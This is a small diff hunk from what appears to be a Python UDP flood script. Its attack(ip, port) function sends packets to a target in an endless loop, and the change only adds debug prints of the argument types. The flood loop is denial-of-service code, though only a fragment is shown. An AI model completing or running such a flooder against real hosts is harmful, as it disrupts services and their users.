@@ -14,6 +14,8 @@ sent = 0
 
 def attack(ip, port):
     global sent, bytes
+    print(ip, type(ip))
+    print(port, type(port))
     while True:
         sock.sendto(bytes, (ip, port))
 
